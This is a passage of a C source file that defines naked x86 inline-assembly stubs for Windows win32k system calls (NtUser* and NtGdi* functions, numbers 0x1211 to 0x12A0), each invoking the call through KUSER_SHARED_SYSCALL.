__declspec(naked) ULONG NTAPI NtUserSetScrollInfo()
{
    __asm {
        mov eax, 00001211h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetShellWindowEx()
{
    __asm {
        mov eax, 00001212h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetSysColors()
{
    __asm {
        mov eax, 00001213h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetSystemCursor()
{
    __asm {
        mov eax, 00001214h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetSystemMenu()
{
    __asm {
        mov eax, 00001215h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetSystemTimer()
{
    __asm {
        mov eax, 00001216h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetThreadDesktop()
{
    __asm {
        mov eax, 00001217h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetThreadLayoutHandles()
{
    __asm {
        mov eax, 00001218h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetThreadState()
{
    __asm {
        mov eax, 00001219h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetTimer()
{
    __asm {
        mov eax, 0000121Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowFNID()
{
    __asm {
        mov eax, 0000121Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowLong()
{
    __asm {
        mov eax, 0000121Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowPlacement()
{
    __asm {
        mov eax, 0000121Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowPos()
{
    __asm {
        mov eax, 0000121Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowRgn()
{
    __asm {
        mov eax, 0000121Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowsHookAW()
{
    __asm {
        mov eax, 00001220h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowsHookEx()
{
    __asm {
        mov eax, 00001221h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowStationUser()
{
    __asm {
        mov eax, 00001222h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowWord()
{
    __asm {
        mov eax, 00001223h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWinEventHook()
{
    __asm {
        mov eax, 00001224h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtUserShowCaret()
{
    __asm {
        mov eax, 00001225h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserShowScrollBar()
{
    __asm {
        mov eax, 00001226h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserShowWindow()
{
    __asm {
        mov eax, 00001227h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserShowWindowAsync()
{
    __asm {
        mov eax, 00001228h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSoundSentry()
{
    __asm {
        mov eax, 00001229h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserSwitchDesktop()
{
    __asm {
        mov eax, 0000122Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSystemParametersInfo()
{
    __asm {
        mov eax, 0000122Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserTestForInteractiveUser()
{
    __asm {
        mov eax, 0000122Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserThunkedMenuInfo()
{
    __asm {
        mov eax, 0000122Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserThunkedMenuItemInfo()
{
    __asm {
        mov eax, 0000122Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserToUnicodeEx()
{
    __asm {
        mov eax, 0000122Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserTrackMouseEvent()
{
    __asm {
        mov eax, 00001230h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserTrackPopupMenuEx()
{
    __asm {
        mov eax, 00001231h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserCalcMenuBar()
{
    __asm {
        mov eax, 00001232h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserPaintMenuBar()
{
    __asm {
        mov eax, 00001233h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserTranslateAccelerator()
{
    __asm {
        mov eax, 00001234h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserTranslateMessage()
{
    __asm {
        mov eax, 00001235h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserUnhookWindowsHookEx()
{
    __asm {
        mov eax, 00001236h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserUnhookWinEvent()
{
    __asm {
        mov eax, 00001237h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserUnloadKeyboardLayout()
{
    __asm {
        mov eax, 00001238h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserUnlockWindowStation()
{
    __asm {
        mov eax, 00001239h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserUnregisterClass()
{
    __asm {
        mov eax, 0000123Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserUnregisterUserApiHook()
{
    __asm {
        mov eax, 0000123Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserUnregisterHotKey()
{
    __asm {
        mov eax, 0000123Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserUpdateInputContext()
{
    __asm {
        mov eax, 0000123Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserUpdateInstance()
{
    __asm {
        mov eax, 0000123Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserUpdateLayeredWindow()
{
    __asm {
        mov eax, 0000123Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000028h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetLayeredWindowAttributes()
{
    __asm {
        mov eax, 00001240h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetLayeredWindowAttributes()
{
    __asm {
        mov eax, 00001241h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserUpdatePerUserSystemParameters()
{
    __asm {
        mov eax, 00001242h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserUserHandleGrantAccess()
{
    __asm {
        mov eax, 00001243h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserValidateHandleSecure()
{
    __asm {
        mov eax, 00001244h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserValidateRect()
{
    __asm {
        mov eax, 00001245h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserValidateTimerCallback()
{
    __asm {
        mov eax, 00001246h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserVkKeyScanEx()
{
    __asm {
        mov eax, 00001247h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserWaitForInputIdle()
{
    __asm {
        mov eax, 00001248h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserWaitForMsgAndEvent()
{
    __asm {
        mov eax, 00001249h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserWaitMessage()
{
    __asm {
        mov eax, 0000124Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserWin32PoolAllocationStats()
{
    __asm {
        mov eax, 0000124Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserWindowFromPoint()
{
    __asm {
        mov eax, 0000124Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserYieldTask()
{
    __asm {
        mov eax, 0000124Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserRemoteConnect()
{
    __asm {
        mov eax, 0000124Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserRemoteRedrawRectangle()
{
    __asm {
        mov eax, 0000124Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserRemoteRedrawScreen()
{
    __asm {
        mov eax, 00001250h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserRemoteStopScreenUpdates()
{
    __asm {
        mov eax, 00001251h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserCtxDisplayIOCtl()
{
    __asm {
        mov eax, 00001252h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngAssociateSurface()
{
    __asm {
        mov eax, 00001253h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngCreateBitmap()
{
    __asm {
        mov eax, 00001254h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngCreateDeviceSurface()
{
    __asm {
        mov eax, 00001255h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngCreateDeviceBitmap()
{
    __asm {
        mov eax, 00001256h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngCreatePalette()
{
    __asm {
        mov eax, 00001257h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngComputeGlyphSet()
{
    __asm {
        mov eax, 00001258h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngCopyBits()
{
    __asm {
        mov eax, 00001259h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngDeletePalette()
{
    __asm {
        mov eax, 0000125Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngDeleteSurface()
{
    __asm {
        mov eax, 0000125Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngEraseSurface()
{
    __asm {
        mov eax, 0000125Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngUnlockSurface()
{
    __asm {
        mov eax, 0000125Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngLockSurface()
{
    __asm {
        mov eax, 0000125Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngBitBlt()
{
    __asm {
        mov eax, 0000125Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngStretchBlt()
{
    __asm {
        mov eax, 00001260h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngPlgBlt()
{
    __asm {
        mov eax, 00001261h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngMarkBandingSurface()
{
    __asm {
        mov eax, 00001262h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngStrokePath()
{
    __asm {
        mov eax, 00001263h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngFillPath()
{
    __asm {
        mov eax, 00001264h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngStrokeAndFillPath()
{
    __asm {
        mov eax, 00001265h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000028h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngPaint()
{
    __asm {
        mov eax, 00001266h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngLineTo()
{
    __asm {
        mov eax, 00001267h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000024h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngAlphaBlend()
{
    __asm {
        mov eax, 00001268h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngGradientFill()
{
    __asm {
        mov eax, 00001269h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000028h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngTransparentBlt()
{
    __asm {
        mov eax, 0000126Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngTextOut()
{
    __asm {
        mov eax, 0000126Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000028h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngStretchBltROP()
{
    __asm {
        mov eax, 0000126Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000034h
    }
}

__declspec(naked) ULONG NTAPI NtGdiXLATEOBJ_cGetPalette()
{
    __asm {
        mov eax, 0000126Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiXLATEOBJ_iXlate()
{
    __asm {
        mov eax, 0000126Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiXLATEOBJ_hGetColorTransform()
{
    __asm {
        mov eax, 0000126Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCLIPOBJ_bEnum()
{
    __asm {
        mov eax, 00001270h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiCLIPOBJ_cEnumStart()
{
    __asm {
        mov eax, 00001271h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCLIPOBJ_ppoGetPath()
{
    __asm {
        mov eax, 00001272h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngDeletePath()
{
    __asm {
        mov eax, 00001273h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngCreateClip()
{
    __asm {
        mov eax, 00001274h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngDeleteClip()
{
    __asm {
        mov eax, 00001275h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiBRUSHOBJ_ulGetBrushColor()
{
    __asm {
        mov eax, 00001276h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiBRUSHOBJ_pvAllocRbrush()
{
    __asm {
        mov eax, 00001277h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiBRUSHOBJ_pvGetRbrush()
{
    __asm {
        mov eax, 00001278h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiBRUSHOBJ_hGetColorTransform()
{
    __asm {
        mov eax, 00001279h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiXFORMOBJ_bApplyXform()
{
    __asm {
        mov eax, 0000127Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiXFORMOBJ_iGetXform()
{
    __asm {
        mov eax, 0000127Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_vGetInfo()
{
    __asm {
        mov eax, 0000127Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_pxoGetXform()
{
    __asm {
        mov eax, 0000127Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_cGetGlyphs()
{
    __asm {
        mov eax, 0000127Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_pifi()
{
    __asm {
        mov eax, 0000127Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_pfdg()
{
    __asm {
        mov eax, 00001280h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_pQueryGlyphAttrs()
{
    __asm {
        mov eax, 00001281h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_pvTrueTypeFontFile()
{
    __asm {
        mov eax, 00001282h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_cGetAllGlyphHandles()
{
    __asm {
        mov eax, 00001283h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSTROBJ_bEnum()
{
    __asm {
        mov eax, 00001284h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSTROBJ_bEnumPositionsOnly()
{
    __asm {
        mov eax, 00001285h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSTROBJ_bGetAdvanceWidths()
{
    __asm {
        mov eax, 00001286h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSTROBJ_vEnumStart()
{
    __asm {
        mov eax, 00001287h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSTROBJ_dwGetCodePage()
{
    __asm {
        mov eax, 00001288h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPATHOBJ_vGetBounds()
{
    __asm {
        mov eax, 00001289h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPATHOBJ_bEnum()
{
    __asm {
        mov eax, 0000128Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPATHOBJ_vEnumStart()
{
    __asm {
        mov eax, 0000128Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPATHOBJ_vEnumStartClipLines()
{
    __asm {
        mov eax, 0000128Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPATHOBJ_bEnumClipLines()
{
    __asm {
        mov eax, 0000128Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDhpdev()
{
    __asm {
        mov eax, 0000128Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngCheckAbort()
{
    __asm {
        mov eax, 0000128Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiHT_Get8BPPFormatPalette()
{
    __asm {
        mov eax, 00001290h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiHT_Get8BPPMaskPalette()
{
    __asm {
        mov eax, 00001291h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiUpdateTransform()
{
    __asm {
        mov eax, 00001292h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetPUMPDOBJ()
{
    __asm {
        mov eax, 00001293h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiBRUSHOBJ_DeleteRbrush()
{
    __asm {
        mov eax, 00001294h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiUMPDEngFreeUserMem()
{
    __asm {
        mov eax, 00001295h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDrawStream()
{
    __asm {
        mov eax, 00001296h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDbgWin32HeapFail()
{
    __asm {
        mov eax, 00001297h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserDbgWin32HeapStat()
{
    __asm {
        mov eax, 00001298h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetDbgTag()
{
    __asm {
        mov eax, 00001299h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetDbgTagCount()
{
    __asm {
        mov eax, 0000129Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetRipFlags()
{
    __asm {
        mov eax, 0000129Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiMakeObjectXferable()
{
    __asm {
        mov eax, 0000129Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtDxEngGetRedirectionBitmap()
{
    __asm {
        mov eax, 0000129Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetViewportOrgEx()
{
    __asm {
        mov eax, 0000129Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetWindowOrgEx()
{
    __asm {
        mov eax, 0000129Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetFontFamilyInfo()
{
    __asm {
        mov eax, 000012A0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

